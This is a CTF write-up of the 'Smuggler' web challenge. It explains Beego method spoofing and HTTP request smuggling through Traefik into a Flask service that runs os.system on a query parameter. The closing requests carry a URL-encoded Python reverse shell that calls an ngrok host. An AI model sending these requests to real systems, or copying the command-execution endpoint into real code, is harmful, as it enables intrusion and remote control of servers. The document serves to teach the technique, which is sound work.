---
description: HTTP Request Smuggling and Method Spoofing
---

# Smuggler

## Challenge

{% hint style="info" %}
Web, 5 Solves
{% endhint %}

> We have managed to leak the source code of an application we want to gain access to, however we couldn't figure out how to trigger the vulnerability we found in it, can you help us?

{% file src="../../.gitbook/assets/src.tar (4).gz" %}

## Solution

This challenge consists of 3 services - Traefik (a HTTP proxy), a Python microservice, and a Go microservice.

### Traefik

The configuration file is shown below. This service acts as a reverse proxy for the Go microservice, and only accepts the POST, GET, OPTIONS, DELETE and PATCH methods.

```javascript
[http]
  [http.routers]
    [http.routers.Router0]
      entryPoints = ["web"]
      service = "app"
      rule = "Method(`POST`, `GET`, `OPTIONS`, `DELETE`, `PATCH`)"

  [http.services]
    [http.services.app]
      [[http.services.app.weighted.services]]
        name = "appv1"

    [http.services.appv1]
      [http.services.appv1.loadBalancer]
        [[http.services.appv1.loadBalancer.servers]]
          url = "http://go-microservice:8080/"
```

### Go Microservice

Taking a look at the Go microservice, we could see that the Beego web framework is used. This service acts as a reverse proxy for the Python microservice when the `PUT` method is used.

```go
package main

import (
	"fmt"
	"github.com/beego/beego/v2/server/web"
	"net/http/httputil"
	"net/url"
)

type MainController struct {
	web.Controller
}

func (this *MainController) Get() {
	fmt.Println(this.Ctx.Request.ContentLength)
	this.Ctx.WriteString("OK")
}

func (this *MainController) Put() {
	targetURL := "http://python-microservice:80/"
	url, err := url.Parse(targetURL)
	if err != nil {
		panic(fmt.Sprintf("failed to parse the URL: %v", err))
	}
	proxy := httputil.NewSingleHostReverseProxy(url)
	proxy.ServeHTTP(this.Ctx.ResponseWriter, this.Ctx.Request)
}

func main() {
	web.Router("/", &MainController{})
	web.Run()
}

```

### Python Microservice

Finally, the Python microservice allows us to run arbitrary commands when the GET method is used. That seems like where we need to go.

```python
import os
from flask import Flask, request
from werkzeug.serving import WSGIRequestHandler

app = Flask(__name__)


@app.route('/')
def run_cmd():
    if 'cmd' in request.args:
        os.system(request.args['cmd'])
    return 'OK'


@app.route('/', methods=['POST'])
def echo_request():
    return request.get_data()


if __name__ == '__main__':
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(host='0.0.0.0', port=80, threaded=True, debug=False)

```

### HTTP Method Spoofing

To get to the Python microservice in the first place, we need to use the PUT method on the Go microservice. Yet, the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods.

As of this CTF, both the Traefik and Beego versions used were the latest versions, with no known CVEs. How then, can we "smuggle" a PUT request to the Go microservice?

I took a look at the Beego [source code](https://github.com/beego/beego/blob/69c17fafbbfd796c7435d60b13f8d557c8850691/server/web/router.go#L1128-L1144), and found some interesting information on how it handles routing. Although the PUT request method is not directly supported by Beego in the request line itself, there is a way to issue a "pseudo" PUT request.

![](<../../.gitbook/assets/Screenshot 2022-07-05 at 12.22.13 PM.png>)

Specifically, when the POST method is used, a check is done on the `_method` query parameter. If we use `?_method=PUT` for instance, the request is routed as if it was a PUT request.

Therefore, the following request would reach the `Put()` handler in the Go microservice:

```http
POST /?_method=PUT HTTP/1.1
Host: foo.bar
```

### HTTP Request Smuggling

Now that we have reached the PUT handler in Beego, we have access to the Python microservice. The Python microservice runs on Flask's built-in server, which is _not_ secure for production. In particular, it does very little to mitigate [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling) attacks.

For instance, underscores (`_`) are converted to hyphens (`-`) and interpreted as such. This means that the `Content_Length` header is treated in the same way as `Content-Length`.&#x20;

The built-in server also allows duplicate `Content-Length` headers, leading to differences between the upstream servers (Traefik and Beego) and the Flask built-in server in interpreting the length of HTTP requests.

Consider the following request:

```http
POST /?_method=PUT HTTP/1.1
Host: localhost
Content-Length: 307
Content_Length: 0

GET /?cmd=python%20-c%20'import%20socket%2csubprocess%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%222.tcp.ngrok.io%22%2c%2011237))%3bsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d%2cstdin%3ds.fileno()%2cstdout%3ds.fileno()%2cstderr%3ds.fileno())' HTTP/1.1
Host: localhost
```

RFC 7230 [allows](https://www.rfc-editor.org/rfc/rfc7230#section-3.2) both underscores and hyphens in header field names.`Content-Length` and `Content_Length` are therefore two distinct headers - they should not be interoperable. In this case, `Content_Length` should be treated like any other header, and not a special header indicating the length of the request body.

Both Traefik and Beego are RFC-compliant in this regard, but the Flask built-in server is not. When both Traefik and Beego process the above request, the second GET request is simply subsumed as part of the first POST request due to the `Content-Length` header indicating a length equal to the length of the second GET request.

The second RFC violation comes from accepting multiple `Content-Length` headers with different values. As [per the RFC](https://www.rfc-editor.org/rfc/rfc7230#section-3.3.3),

> If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error.

In this case, the Flask built-in server takes the _last_ `Content-Length` header value as the length of the request body. Therefore, it sees the length of the request body as 0.

```http
Content-Length: 307
Content_Length: 0
```

When the POST request arrives, it is treated as two separate requests, as though the following request was made:

```http
POST /?_method=PUT HTTP/1.1
Host: localhost
Content-Length: 0

GET /?cmd=python%20-c%20'import%20socket%2csubprocess%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%222.tcp.ngrok.io%22%2c%2011237))%3bsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d%2cstdin%3ds.fileno()%2cstdout%3ds.fileno()%2cstderr%3ds.fileno())' HTTP/1.1
Host: localhost
```

We have smuggled a GET request to the Python microservice, allowing us to get a reverse shell and obtain the flag.
